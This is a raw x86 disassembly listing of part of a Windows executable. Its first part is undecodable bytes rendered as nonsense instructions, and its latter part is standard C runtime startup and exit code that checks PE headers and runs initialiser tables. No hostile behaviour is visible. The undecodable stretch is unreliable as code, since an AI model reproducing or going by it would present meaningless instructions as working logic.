  422542:	fisubr WORD PTR [eax+0x5fa680e3]
  422548:	mov    dx,0x9a5f
  42254c:	mov    dl,0x61
  42254e:	jl     0x42250c
  422550:	mov    esi,0x48491a56
  422555:	pop    es
  422556:	lods   eax,DWORD PTR ds:[esi]
  422557:	popa   
  422558:	pop    eax
  422559:	sub    al,0x6c
  42255b:	ins    BYTE PTR es:[edi],dx
  42255c:	and    al,0xe6
  42255e:	or     ecx,eax
  422560:	mov    al,0x29
  422562:	cmp    DWORD PTR [esi-0x6cf5c49b],edi
  422568:	out    dx,eax
  422569:	addr16 mov edx,0x18f186b0
  42256f:	(bad)  
  422570:	sbb    BYTE PTR [eax+0x607a7f4],dh
  422576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422577:	or     BYTE PTR [edi+0x2bad59bb],ch
  42257d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42257e:	arpl   WORD PTR [edx+edi*2+0x3dd69c6e],bp
  422585:	xor    ch,0xbf
  422588:	xor    dh,bl
  42258a:	mov    WORD PTR [ebx+0x6],gs
  42258d:	imul   ebp,esi,0x309e9945
  422593:	jmp    0xb43ad73b
  422598:	lods   eax,DWORD PTR ds:[esi]
  422599:	or     DWORD PTR [edi-0x7c],edx
  42259c:	out    0x8e,al
  42259e:	jns    0x4225b3
  4225a0:	(bad)  
  4225a1:	leave  
  4225a2:	or     eax,0x77e932fe
  4225a7:	push   esi
  4225a8:	sub    DWORD PTR [ecx],edx
  4225aa:	mov    esi,DWORD PTR [esi+edi*1-0x51]
  4225ae:	enter  0x3685,0xcd
  4225b2:	xor    DWORD PTR [ebx-0x5176df98],0xffffff86
  4225b9:	and    ch,dh
  4225bb:	scas   al,BYTE PTR es:[edi]
  4225bc:	loopne 0x42259c
  4225be:	in     al,0x9e
  4225c0:	or     bh,dh
  4225c2:	xchg   esi,eax
  4225c3:	mov    esi,0xb7e7d395
  4225c8:	sbb    eax,0x35fa4314
  4225cd:	adc    dl,BYTE PTR ds:0xce4b7432
  4225d3:	out    dx,eax
  4225d4:	pushf  
  4225d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225d6:	mov    dh,0x83
  4225d8:	mov    cl,0x48
  4225da:	stos   BYTE PTR es:[edi],al
  4225db:	xchg   ebx,eax
  4225dc:	jmp    0x6583:0x650a178
  4225e3:	bndldx (bad),[edi+0xc]
  4225e7:	jns    0x42259a
  4225e9:	push   eax
  4225ea:	mov    edi,0xd49e32f8
  4225ef:	imul   eax,DWORD PTR [ebp-0x3e70be61],0x37
  4225f6:	jne    0x422663
  4225f8:	fcmove st,st(4)
  4225fa:	mov    al,0xaa
  4225fc:	mov    ah,0xa0
  4225fe:	adc    esp,ebx
  422600:	mov    ?,WORD PTR [edi-0x3c6849f3]
  422606:	xchg   edx,eax
  422607:	pop    edx
  422608:	jnp    0x422645
  42260a:	pop    esp
  42260b:	mov    ah,0x18
  42260d:	pop    ecx
  42260e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42260f:	fnstenv [eax]
  422611:	inc    eax
  422612:	inc    esp
  422613:	fucomi st,st(0)
  422615:	jle    0x42261b
  422617:	add    DWORD PTR [edi-0x6342898],ebp
  42261d:	cmp    eax,0x67a3eb56
  422622:	jns    0x4225b6
  422624:	jl     0x422683
  422626:	jmp    0xd908:0x4955098d
  42262d:	ret    
  42262e:	stc    
  42262f:	jle    0x422681
  422631:	add    dh,BYTE PTR [edx+0x6a84a419]
  422637:	mov    ecx,0xb8cca9f7
  42263c:	lds    ebx,FWORD PTR [esi-0x8ee5ccb]
  422642:	sbb    DWORD PTR [edx+eax*2+0x142a38e3],edi
  422649:	add    bl,ah
  42264b:	xchg   bh,ah
  42264d:	mov    ch,0x66
  42264f:	dec    esi
  422650:	xor    bl,BYTE PTR [ebx+0x51ed56f1]
  422656:	push   ss
  422657:	xor    edi,esi
  422659:	push   edx
  42265a:	sub    DWORD PTR [ebx+0x18313090],edi
  422660:	aaa    
  422661:	and    BYTE PTR [edx],ah
  422663:	jecxz  0x4225e6
  422665:	retf   0x5207
  422668:	fwait
  422669:	inc    esi
  42266a:	leave  
  42266b:	or     al,BYTE PTR [edi-0xc53046c]
  422671:	popf   
  422672:	sbb    BYTE PTR [edx],cl
  422674:	clc    
  422675:	sbb    DWORD PTR [edx],ebx
  422677:	ins    DWORD PTR es:[edi],dx
  422678:	mov    al,0x5b
  42267a:	hlt    
  42267b:	jae    0x422689
  42267d:	out    0x49,al
  42267f:	lods   al,BYTE PTR ds:[esi]
  422680:	out    dx,eax
  422681:	sar    BYTE PTR [ebx-0x35908209],1
  422687:	ins    DWORD PTR es:[edi],dx
  422688:	or     DWORD PTR [edx-0x1a931ad2],ecx
  42268e:	xor    ah,BYTE PTR [eax]
  422690:	inc    ebp
  422691:	xor    DWORD PTR [ebx-0x10],edx
  422694:	das    
  422695:	rcr    DWORD PTR [ebp-0x5db814d1],1
  42269b:	pop    esi
  42269c:	call   0xbeb7:0x6c50695c
  4226a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a4:	(bad)  
  4226a5:	pop    ebp
  4226a6:	inc    edi
  4226a8:	sbb    al,0x49
  4226aa:	(bad)  
  4226ab:	mov    ds:0xcb6248ac,al
  4226b0:	xchg   ecx,eax
  4226b1:	loop   0x42264a
  4226b3:	pop    esp
  4226b4:	cmp    eax,0x3a72071f
  4226b9:	mov    bl,0xa2
  4226bb:	sti    
  4226bc:	mov    ?,WORD PTR [eax+0x31]
  4226bf:	fisttp QWORD PTR [esp+edx*1+0x26dae8fe]
  4226c6:	adc    al,0xd5
  4226c8:	sub    ebx,DWORD PTR [eax+0xe34c62d]
  4226ce:	inc    edi
  4226cf:	call   0xa2c2:0xb2bced2d
  4226d6:	or     DWORD PTR [eax-0x10d4fcbb],edi
  4226dc:	popf   
  4226dd:	mov    eax,0xa1dd7131
  4226e2:	ins    BYTE PTR es:[edi],dx
  4226e3:	fsub   DWORD PTR [ecx]
  4226e5:	jno    0x422667
  4226e7:	add    al,0x92
  4226e9:	cli    
  4226ea:	or     ah,BYTE PTR [edx+0x54f1f5bc]
  4226f0:	inc    esi
  4226f1:	and    BYTE PTR [esi],bl
  4226f3:	push   eax
  4226f4:	call   0x3a6df4cf
  4226f9:	dec    esp
  4226fa:	add    BYTE PTR [ecx-0x5d],al
  4226fd:	jnp    0x4226af
  4226ff:	loope  0x42273a
  422701:	xchg   ebp,eax
  422702:	clc    
  422703:	mov    ds:0x684b86d,eax
  422708:	int3   
  422709:	aas    
  42270a:	or     eax,0x52eb2428
  42270f:	iret   
  422710:	fisubr DWORD PTR [ecx-0x17fceea5]
  422716:	lods   al,BYTE PTR ds:[esi]
  422717:	push   ebx
  422718:	mov    esi,DWORD PTR [eax+0x2c]
  42271b:	ror    DWORD PTR [ebx-0x2c],1
  42271e:	pand   mm0,QWORD PTR [ebx]
  422721:	in     al,0x2f
  422723:	and    bh,BYTE PTR [ecx-0x13d2200]
  422729:	or     edx,ebx
  42272b:	repz dec edx
  42272d:	mov    edi,0x757a6ae1
  422732:	js     0x42279f
  422734:	mov    bl,0xd
  422736:	das    
  422737:	and    ah,dl
  422739:	pop    ecx
  42273a:	adc    BYTE PTR [eax],bl
  42273c:	(bad)  
  42273d:	lock cmc 
  42273f:	outs   dx,DWORD PTR ds:[esi]
  422740:	or     al,0xf
  422742:	cmp    al,0x59
  422744:	jecxz  0x4226d4
  422746:	loopne 0x4226f6
  422748:	(bad)  
  422749:	add    al,0x72
  42274b:	inc    eax
  42274c:	mov    ebx,0x8af10d05
  422751:	xchg   ebp,eax
  422752:	cdq    
  422753:	pop    edi
  422754:	sub    BYTE PTR [eax+0x31],al
  422757:	fadd   QWORD PTR [ebp-0x8d9806f]
  42275d:	xor    BYTE PTR [edx-0x6ebae98a],ah
  422763:	sar    BYTE PTR [eax+edi*8+0x79],0x4a
  422768:	mov    ds:0x75371cc0,eax
  42276d:	mov    al,BYTE PTR [ecx-0xe]
  422770:	xor    BYTE PTR [esi+0x20],bh
  422773:	fild   WORD PTR [ecx]
  422775:	jl     0x4227a1
  422777:	add    BYTE PTR [eax+0x68f5c113],dl
  42277d:	dec    ecx
  42277e:	(bad)  
  42277f:	cdq    
  422780:	fdivr  st(4),st
  422782:	cmp    BYTE PTR [ebx],al
  422784:	imul   esi,ecx,0x4911bad0
  42278a:	jne    0x4227be
  42278c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42278d:	xor    bh,dl
  42278f:	rcr    esp,1
  422791:	dec    ebp
  422792:	sahf   
  422793:	jle    0x4227dc
  422795:	call   0x3009:0x6f1f0949
  42279c:	les    edx,FWORD PTR [edi-0x1a8103f9]
  4227a2:	or     BYTE PTR [eax-0x70],0x60
  4227a6:	pop    edx
  4227a7:	cmp    bl,BYTE PTR ds:0xcbaa17d1
  4227ad:	mov    bl,0xfa
  4227af:	sub    ah,BYTE PTR [edi-0x4e]
  4227b2:	lods   al,BYTE PTR ds:[esi]
  4227b3:	xlat   BYTE PTR ds:[ebx]
  4227b4:	dec    edi
  4227b5:	jnp    0x422771
  4227b7:	adc    ecx,edx
  4227b9:	sahf   
  4227ba:	mov    bl,0x85
  4227bc:	mov    esi,0xb990c0c5
  4227c1:	sbb    dh,dl
  4227c3:	mov    edi,0x7fdaf418
  4227c8:	push   edx
  4227c9:	push   ebx
  4227ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227cb:	push   esp
  4227cc:	repz in eax,dx
  4227ce:	inc    esp
  4227cf:	fbld   TBYTE PTR [edx]
  4227d1:	ins    BYTE PTR es:[edi],dx
  4227d2:	dec    eax
  4227d3:	cmp    DWORD PTR [ebx+0x5622c1d0],eax
  4227d9:	cmc    
  4227da:	ret    0x4050
  4227dd:	add    DWORD PTR [ecx-0x41cfd845],edi
  4227e3:	add    BYTE PTR ds:0x2f96383,dh
  4227e9:	mov    esp,0x6f8f271
  4227ee:	mov    al,0xad
  4227f0:	mov    ds:0x3621d265,eax
  4227f5:	xchg   esi,eax
  4227f6:	adc    al,0xb1
  4227f8:	or     eax,0xfb4115f2
  4227fd:	xor    BYTE PTR [eax-0x72a1e75f],0xa9
  422804:	dec    edi
  422805:	popa   
  422806:	fcom   QWORD PTR [ecx]
  422808:	or     eax,0xac3926b9
  42280d:	aad    0x49
  42280f:	int    0x1c
  422811:	xchg   edi,eax
  422812:	retf   0x8cf8
  422815:	popf   
  422816:	add    al,cl
  422818:	test   DWORD PTR [edx-0x3c],ecx
  42281b:	icebp  
  42281c:	jmp    0x4f81a050
  422821:	js     0x4227a9
  422823:	pop    edx
  422824:	push   ebx
  422825:	stc    
  422826:	or     eax,0xe9744199
  42282b:	out    dx,al
  42282c:	adc    DWORD PTR [edi+0x1f3bb390],esi
  422832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422833:	inc    edx
  422834:	lods   al,BYTE PTR ds:[esi]
  422836:	lds    esp,FWORD PTR [ecx+0x1b]
  422839:	sti    
  42283a:	inc    ebp
  42283b:	vhsubps ymm0,ymm0,YMMWORD PTR [esi+0x12fd1521]
  422843:	call   0x631331cb
  422848:	ds das 
  42284a:	xchg   esp,eax
  42284b:	push   esi
  42284c:	pop    ebp
  42284d:	ret    
  42284e:	lock xchg al,dh
  422851:	shr    BYTE PTR [eax-0x5b785a39],0x86
  422858:	mov    ecx,DWORD PTR [edx]
  42285a:	xchg   ebp,eax
  42285b:	mov    esi,0xc911c7a2
  422860:	adc    bl,BYTE PTR [esi+0x45]
  422863:	mov    dh,0x3c
  422865:	jl     0x422842
  422867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422868:	pop    ebx
  422869:	adc    edi,DWORD PTR [ebp-0x6ca940e3]
  42286f:	mov    ds:0x5c83d69c,eax
  422874:	std    
  422875:	add    ebp,eax
  422877:	leave  
  422878:	dec    ebp
  422879:	jmp    0xaf12:0x81c7d2a
  422880:	sub    al,0x8
  422882:	push   ecx
  422883:	mov    al,bh
  422885:	jge    0x42284e
  422887:	les    esi,FWORD PTR [edi+0x2a]
  42288a:	(bad)  [ecx-0x32]
  42288d:	cmp    DWORD PTR [ecx+0xdacae69],ebp
  422893:	(bad)  
  422894:	idiv   DWORD PTR [ebx-0x37]
  422897:	pushf  
  422898:	xchg   BYTE PTR [ecx-0x539aa463],bh
  42289e:	ja     0x4228df
  4228a0:	adc    ecx,DWORD PTR [ecx+0x3438e94e]
  4228a6:	mov    esi,0xf9c15ef3
  4228ab:	mov    bl,0xbf
  4228ad:	jbe    0x422902
  4228af:	ds dec ebx
  4228b1:	test   DWORD PTR [ebx+ebp*8],ebx
  4228b4:	sbb    cl,ah
  4228b6:	inc    esi
  4228b7:	sub    DWORD PTR [eax],eax
  4228b9:	and    DWORD PTR [edi+0x3969486],esp
  4228bf:	or     ebx,ecx
  4228c1:	mov    esi,0x71effc5a
  4228c6:	lds    ebp,FWORD PTR [ecx]
  4228c8:	pop    esp
  4228c9:	mov    ch,0xc6
  4228cb:	xor    eax,0x52e1c158
  4228d0:	pop    es
  4228d1:	and    cl,dl
  4228d3:	mov    BYTE PTR [ebx+0x59],0x75
  4228d7:	xor    eax,DWORD PTR [eax-0x73]
  4228da:	jle    0x42289b
  4228dc:	imul   edx,DWORD PTR [edi+ebp*4],0xe2d4d928
  4228e3:	mov    al,ds:0x535ea7a
  4228e8:	xor    al,0xff
  4228ea:	imul   dl
  4228ec:	mov    ah,0x8f
  4228ee:	jge    0x422907
  4228f0:	mov    al,ds:0xe9fd31dd
  4228f5:	(bad)
  4228f8:	mov    cl,0xd7
  4228fb:	mov    esp,0x697162a8
  422900:	pop    esp
  422901:	shl    esi,1
  422903:	es test al,0xad
  422906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422907:	xchg   esi,eax
  422908:	ret    
  422909:	mov    ah,0xe8
  42290b:	add    al,0x8f
  42290d:	sti    
  42290e:	push   ss
  42290f:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  422911:	push   ds
  422912:	xchg   esp,eax
  422913:	dec    esp
  422914:	inc    edx
  422915:	aas    
  422916:	jae    0x42294f
  422918:	cli    
  422919:	add    dl,dl
  42291b:	jmp    0x42fd60cf
  422920:	push   ds
  422921:	inc    esp
  422922:	dec    ebp
  422923:	mov    ebp,0xb403f9d3
  422928:	js     0x4228e9
  42292a:	pushf  
  42292b:	cmp    DWORD PTR [edi-0x8],eax
  42292e:	test   DWORD PTR [ecx+ebx*8-0xaab8448],esp
  422935:	sub    al,dh
  422937:	ret    0x3736
  42293a:	inc    eax
  42293b:	sub    esp,ebp
  42293d:	add    edx,DWORD PTR [edi-0x6e00d246]
  422943:	je     0x422996
  422945:	mov    bl,0xd9
  422947:	xor    dl,dh
  422949:	jmp    0x78c452d8
  42294e:	push   edx
  42294f:	xor    DWORD PTR ds:0xe401875a,0x7b
  422956:	push   edx
  422957:	stos   BYTE PTR es:[edi],al
  422958:	ficom  WORD PTR [edi-0x6e]
  42295b:	pop    ecx
  42295c:	or     ecx,DWORD PTR [esi-0x76e11771]
  422962:	push   0xde603b58
  422967:	jns    0x422903
  422969:	sbb    al,0x1a
  42296b:	inc    edx
  42296c:	dec    BYTE PTR [ebx+ebp*1+0x3131cc2b]
  422973:	and    esp,edi
  422975:	cli    
  422976:	(bad)  
  422977:	adc    DWORD PTR [edx],eax
  422979:	cdq    
  42297a:	dec    eax
  42297b:	into   
  42297c:	push   edx
  42297d:	push   esp
  42297e:	call   0x830c:0x50460d3b
  422985:	xlat   BYTE PTR ds:[ebx]
  422986:	(bad)  
  422987:	push   ss
  422988:	mov    ds:0x4370847,eax
  42298d:	data16 lods al,BYTE PTR ds:[esi]
  42298f:	or     eax,0xea02a36c
  422994:	imul   esp,DWORD PTR [ebx],0x1a
  422997:	(bad)  
  422998:	fld    TBYTE PTR [ebx+0x7e]
  42299b:	adc    eax,DWORD PTR [esi]
  42299d:	ja     0x422977
  42299f:	ret    
  4229a0:	arpl   bx,ax
  4229a2:	push   0xffffffb5
  4229a4:	in     al,dx
  4229a5:	or     ah,0x46
  4229a8:	inc    ebx
  4229a9:	and    BYTE PTR ds:0xec3ea564,cl
  4229af:	icebp  
  4229b0:	mov    ds:0x35da77e5,eax
  4229b5:	inc    eax
  4229b6:	jmp    0xaf17:0x5fd89dcf
  4229bd:	ja     0x4229c8
  4229bf:	mov    al,ds:0x49bbaf2f
  4229c4:	push   ecx
  4229c5:	xchg   esi,eax
  4229c6:	aaa    
  4229c7:	out    dx,eax
  4229c8:	xor    eax,ecx
  4229ca:	test   al,0x26
  4229cc:	inc    ecx
  4229cd:	not    BYTE PTR [eax-0x60ade2b3]
  4229d3:	jmp    0x56651956
  4229d8:	cmp    ecx,DWORD PTR [edx+0x5e]
  4229db:	(bad)  
  4229dc:	or     BYTE PTR [eax],dh
  4229de:	mov    ss,WORD PTR [edx-0x46]
  4229e1:	cmp    BYTE PTR [eax-0x273c25c6],ah
  4229e7:	adc    edx,ebx
  4229e9:	inc    edi
  4229ea:	mov    ch,BYTE PTR [ecx+ebx*8+0x9101ea5]
  4229f1:	push   0x0
  4229f3:	call   DWORD PTR ds:0x428134
  4229f9:	push   0x0
  4229fb:	push   0x0
  4229fd:	push   0x100000
  422a02:	call   DWORD PTR ds:0x42802c
  422a08:	xor    eax,eax
  422a0a:	add    esp,0x10
  422a0d:	ret    0x10
  422a10:	jmp    DWORD PTR ds:0x428118
  422a16:	cmp    DWORD PTR ds:0x465cfc,0x1
  422a1d:	jne    0x422a24
  422a1f:	call   0x422f62
  422a24:	push   DWORD PTR [esp+0x4]
  422a28:	call   0x422deb
  422a2d:	push   0xff
  422a32:	call   DWORD PTR ds:0x4653e8
  422a38:	pop    ecx
  422a39:	pop    ecx
  422a3a:	ret    
  422a3b:	cmp    DWORD PTR ds:0x465cfc,0x1
  422a42:	jne    0x422a49
  422a44:	call   0x422f62
  422a49:	push   DWORD PTR [esp+0x4]
  422a4d:	call   0x422deb
  422a52:	push   0xff
  422a57:	call   0x422c31
  422a5c:	pop    ecx
  422a5d:	pop    ecx
  422a5e:	ret    
  422a5f:	push   0x60
  422a61:	push   0x428160
  422a66:	call   0x423950
  422a6b:	mov    edi,0x94
  422a70:	mov    eax,edi
  422a72:	call   0x4239a0
  422a77:	mov    DWORD PTR [ebp-0x18],esp
  422a7a:	mov    esi,esp
  422a7c:	mov    DWORD PTR [esi],edi
  422a7e:	push   esi
  422a7f:	call   DWORD PTR ds:0x428064
  422a85:	mov    ecx,DWORD PTR [esi+0x10]
  422a88:	mov    DWORD PTR ds:0x465d04,ecx
  422a8e:	mov    eax,DWORD PTR [esi+0x4]
  422a91:	mov    ds:0x465d10,eax
  422a96:	mov    edx,DWORD PTR [esi+0x8]
  422a99:	mov    DWORD PTR ds:0x465d14,edx
  422a9f:	mov    esi,DWORD PTR [esi+0xc]
  422aa2:	and    esi,0x7fff
  422aa8:	mov    DWORD PTR ds:0x465d08,esi
  422aae:	cmp    ecx,0x2
  422ab1:	je     0x422abf
  422ab3:	or     esi,0x8000
  422ab9:	mov    DWORD PTR ds:0x465d08,esi
  422abf:	shl    eax,0x8
  422ac2:	add    eax,edx
  422ac4:	mov    ds:0x465d0c,eax
  422ac9:	xor    esi,esi
  422acb:	push   esi
  422acc:	mov    edi,DWORD PTR ds:0x428044
  422ad2:	call   edi
  422ad4:	cmp    WORD PTR [eax],0x5a4d
  422ad9:	jne    0x422afa
  422adb:	mov    ecx,DWORD PTR [eax+0x3c]
  422ade:	add    ecx,eax
  422ae0:	cmp    DWORD PTR [ecx],0x4550
  422ae6:	jne    0x422afa
  422ae8:	movzx  eax,WORD PTR [ecx+0x18]
  422aec:	cmp    eax,0x10b
  422af1:	je     0x422b12
  422af3:	cmp    eax,0x20b
  422af8:	je     0x422aff
  422afa:	mov    DWORD PTR [ebp-0x1c],esi
  422afd:	jmp    0x422b26
  422aff:	cmp    DWORD PTR [ecx+0x84],0xe
  422b06:	jbe    0x422afa
  422b08:	xor    eax,eax
  422b0a:	cmp    DWORD PTR [ecx+0xf8],esi
  422b10:	jmp    0x422b20
  422b12:	cmp    DWORD PTR [ecx+0x74],0xe
  422b16:	jbe    0x422afa
  422b18:	xor    eax,eax
  422b1a:	cmp    DWORD PTR [ecx+0xe8],esi
  422b20:	setne  al
  422b23:	mov    DWORD PTR [ebp-0x1c],eax
  422b26:	push   0x1
  422b28:	call   0x4238fd
  422b2d:	pop    ecx
  422b2e:	test   eax,eax
  422b30:	jne    0x422b3a
  422b32:	push   0x1c
  422b34:	call   0x422a3b
  422b39:	pop    ecx
  422b3a:	call   0x423874
  422b3f:	test   eax,eax
  422b41:	jne    0x422b4b
  422b43:	push   0x10
  422b45:	call   0x422a3b
  422b4a:	pop    ecx
  422b4b:	call   0x42375d
  422b50:	mov    DWORD PTR [ebp-0x4],esi
  422b53:	call   0x42355f
  422b58:	test   eax,eax
  422b5a:	jge    0x422b64
  422b5c:	push   0x1b
  422b5e:	call   0x422a16
  422b63:	pop    ecx
  422b64:	call   DWORD PTR ds:0x428060
  422b6a:	mov    ds:0x4664b4,eax
  422b6f:	call   0x42343d
  422b74:	mov    ds:0x465cf4,eax
  422b79:	call   0x42339b
  422b7e:	test   eax,eax
  422b80:	jge    0x422b8a
  422b82:	push   0x8
  422b84:	call   0x422a16
  422b89:	pop    ecx
  422b8a:	call   0x423168
  422b8f:	test   eax,eax
  422b91:	jge    0x422b9b
  422b93:	push   0x9
  422b95:	call   0x422a16
  422b9a:	pop    ecx
  422b9b:	call   0x422c73
  422ba0:	mov    DWORD PTR [ebp-0x20],eax
  422ba3:	cmp    eax,esi
  422ba5:	je     0x422bae
  422ba7:	push   eax
  422ba8:	call   0x422a16
  422bad:	pop    ecx
  422bae:	mov    DWORD PTR [ebp-0x38],esi
  422bb1:	lea    eax,[ebp-0x64]
  422bb4:	push   eax
  422bb5:	call   DWORD PTR ds:0x42805c
  422bbb:	call   0x4230ff
  422bc0:	mov    DWORD PTR [ebp-0x68],eax
  422bc3:	test   BYTE PTR [ebp-0x38],0x1
  422bc7:	je     0x422bcf
  422bc9:	movzx  eax,WORD PTR [ebp-0x34]
  422bcd:	jmp    0x422bd2
  422bcf:	push   0xa
  422bd1:	pop    eax
  422bd2:	push   eax
  422bd3:	push   DWORD PTR [ebp-0x68]
  422bd6:	push   esi
  422bd7:	push   esi
  422bd8:	call   edi
  422bda:	push   eax
  422bdb:	call   0x421880
  422be0:	mov    edi,eax
  422be2:	mov    DWORD PTR [ebp-0x6c],edi
  422be5:	cmp    DWORD PTR [ebp-0x1c],esi
  422be8:	jne    0x422bf0
  422bea:	push   edi
  422beb:	call   0x422dab
  422bf0:	call   0x422dcd
  422bf5:	jmp    0x422c22
  422bf7:	mov    eax,DWORD PTR [ebp-0x14]
  422bfa:	mov    ecx,DWORD PTR [eax]
  422bfc:	mov    ecx,DWORD PTR [ecx]
  422bfe:	mov    DWORD PTR [ebp-0x70],ecx
  422c01:	push   eax
  422c02:	push   ecx
  422c03:	call   0x422f9b
  422c08:	pop    ecx
  422c09:	pop    ecx
  422c0a:	ret    
  422c0b:	mov    esp,DWORD PTR [ebp-0x18]
  422c0e:	mov    edi,DWORD PTR [ebp-0x70]
  422c11:	cmp    DWORD PTR [ebp-0x1c],0x0
  422c15:	jne    0x422c1d
  422c17:	push   edi
  422c18:	call   0x422dbc
  422c1d:	call   0x422ddc
  422c22:	or     DWORD PTR [ebp-0x4],0xffffffff
  422c26:	mov    eax,edi
  422c28:	lea    esp,[ebp-0x7c]
  422c2b:	call   0x42398b
  422c30:	ret    
  422c31:	push   0x42817c
  422c36:	call   DWORD PTR ds:0x428044
  422c3c:	test   eax,eax
  422c3e:	je     0x422c56
  422c40:	push   0x42816c
  422c45:	push   eax
  422c46:	call   DWORD PTR ds:0x428040
  422c4c:	test   eax,eax
  422c4e:	je     0x422c56
  422c50:	push   DWORD PTR [esp+0x4]
  422c54:	call   eax
  422c56:	push   DWORD PTR [esp+0x4]
  422c5a:	call   DWORD PTR ds:0x428068
  422c60:	int3   
  422c61:	push   0x8
  422c63:	call   0x423b0f
  422c68:	pop    ecx
  422c69:	ret    
  422c6a:	push   0x8
  422c6c:	call   0x423a7b
  422c71:	pop    ecx
  422c72:	ret    
  422c73:	mov    eax,ds:0x4664b0
  422c78:	test   eax,eax
  422c7a:	je     0x422c7e
  422c7c:	call   eax
  422c7e:	push   esi
  422c7f:	push   edi
  422c80:	mov    ecx,0x42a00c
  422c85:	mov    edi,0x42a018
  422c8a:	xor    eax,eax
  422c8c:	cmp    ecx,edi
  422c8e:	mov    esi,ecx
  422c90:	jae    0x422ca9
  422c92:	test   eax,eax
  422c94:	jne    0x422cd5
  422c96:	mov    ecx,DWORD PTR [esi]
  422c98:	test   ecx,ecx
  422c9a:	je     0x422c9e
  422c9c:	call   ecx
  422c9e:	add    esi,0x4
  422ca1:	cmp    esi,edi
  422ca3:	jb     0x422c92
  422ca5:	test   eax,eax
  422ca7:	jne    0x422cd5
  422ca9:	push   0x4237a1
  422cae:	call   0x423c20
  422cb3:	mov    esi,0x42a000
  422cb8:	mov    eax,esi
  422cba:	mov    edi,0x42a008
  422cbf:	cmp    eax,edi
  422cc1:	pop    ecx
  422cc2:	jae    0x422cd3
  422cc4:	mov    eax,DWORD PTR [esi]
  422cc6:	test   eax,eax
  422cc8:	je     0x422ccc
  422cca:	call   eax
  422ccc:	add    esi,0x4
  422ccf:	cmp    esi,edi
  422cd1:	jb     0x422cc4
  422cd3:	xor    eax,eax
  422cd5:	pop    edi
  422cd6:	pop    esi
  422cd7:	ret    
  422cd8:	push   ebp
  422cd9:	mov    ebp,esp
  422cdb:	push   esi
  422cdc:	push   edi
  422cdd:	push   0x8
  422cdf:	call   0x423b0f
  422ce4:	xor    esi,esi
  422ce6:	inc    esi
  422ce7:	cmp    DWORD PTR ds:0x465d44,esi
  422ced:	pop    ecx
  422cee:	jne    0x422d00
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	call   DWORD PTR ds:0x428070
  422cf9:	push   eax
  422cfa:	call   DWORD PTR ds:0x42806c
  422d00:	cmp    DWORD PTR [ebp+0xc],0x0
  422d04:	mov    al,BYTE PTR [ebp+0x10]
  422d07:	mov    DWORD PTR ds:0x465d40,esi
  422d0d:	mov    ds:0x465d3c,al
  422d12:	jne    0x422d66
  422d14:	mov    ecx,DWORD PTR ds:0x4664a8
  422d1a:	test   ecx,ecx
  422d1c:	je     0x422d47
  422d1e:	mov    eax,ds:0x4664a4
  422d23:	sub    eax,0x4
  422d26:	cmp    eax,ecx
  422d28:	jmp    0x422d40
  422d2a:	mov    eax,DWORD PTR [eax]
  422d2c:	test   eax,eax
  422d2e:	je     0x422d32
  422d30:	call   eax
  422d32:	mov    eax,ds:0x4664a4
  422d37:	sub    eax,0x4
  422d3a:	cmp    eax,DWORD PTR ds:0x4664a8
  422d40:	mov    ds:0x4664a4,eax
  422d45:	jae    0x422d2a
  422d47:	mov    eax,0x42a01c
  422d4c:	mov    esi,0x42a020
  422d51:	cmp    eax,esi
  422d53:	mov    edi,eax
  422d55:	jae    0x422d66
  422d57:	mov    eax,DWORD PTR [edi]
  422d59:	test   eax,eax
  422d5b:	je     0x422d5f
  422d5d:	call   eax
  422d5f:	add    edi,0x4
  422d62:	cmp    edi,esi
  422d64:	jb     0x422d57
  422d66:	mov    eax,0x42a024
  422d6b:	mov    esi,0x42a028
  422d70:	cmp    eax,esi
  422d72:	mov    edi,eax
  422d74:	jae    0x422d85
  422d76:	mov    eax,DWORD PTR [edi]
  422d78:	test   eax,eax
  422d7a:	je     0x422d7e
  422d7c:	call   eax
  422d7e:	add    edi,0x4
  422d81:	cmp    edi,esi
  422d83:	jb     0x422d76
  422d85:	cmp    DWORD PTR [ebp+0x10],0x0
  422d89:	pop    edi
  422d8a:	pop    esi
  422d8b:	je     0x422d96
  422d8d:	push   0x8
  422d8f:	call   0x423a7b
  422d94:	jmp    0x422da8
  422d96:	push   DWORD PTR [ebp+0x8]
  422d99:	mov    DWORD PTR ds:0x465d44,0x1
  422da3:	call   0x422c31
  422da8:	pop    ecx
  422da9:	pop    ebp
  422daa:	ret    
  422dab:	push   0x0
  422dad:	push   0x0
  422daf:	push   DWORD PTR [esp+0xc]
  422db3:	call   0x422cd8
  422db8:	add    esp,0xc
  422dbb:	ret    
  422dbc:	push   0x0
  422dbe:	push   0x1
  422dc0:	push   DWORD PTR [esp+0xc]
  422dc4:	call   0x422cd8
  422dc9:	add    esp,0xc
  422dcc:	ret    
  422dcd:	push   0x1
  422dcf:	push   0x0
  422dd1:	push   0x0
  422dd3:	call   0x422cd8
  422dd8:	add    esp,0xc
  422ddb:	ret    
  422ddc:	push   0x1
  422dde:	push   0x1
  422de0:	push   0x0
  422de2:	call   0x422cd8
  422de7:	add    esp,0xc
  422dea:	ret    
  422deb:	push   ebp
  422dec:	mov    ebp,esp
  422dee:	sub    esp,0x10c
  422df4:	mov    eax,ds:0x465660
  422df9:	xor    eax,DWORD PTR [ebp+0x4]
  422dfc:	mov    ecx,DWORD PTR [ebp+0x8]
  422dff:	push   ebx
  422e00:	push   esi
  422e01:	mov    DWORD PTR [ebp-0x4],eax
  422e04:	xor    edx,edx
  422e06:	push   edi
  422e07:	xor    eax,eax
  422e09:	cmp    ecx,DWORD PTR [eax*8+0x4653f0]
  422e10:	je     0x422e18
  422e12:	inc    eax
  422e13:	cmp    eax,0x12
  422e16:	jb     0x422e09
  422e18:	mov    esi,eax
  422e1a:	shl    esi,0x3
  422e1d:	cmp    ecx,DWORD PTR [esi+0x4653f0]
  422e23:	jne    0x422f4c
  422e29:	mov    eax,ds:0x465cfc
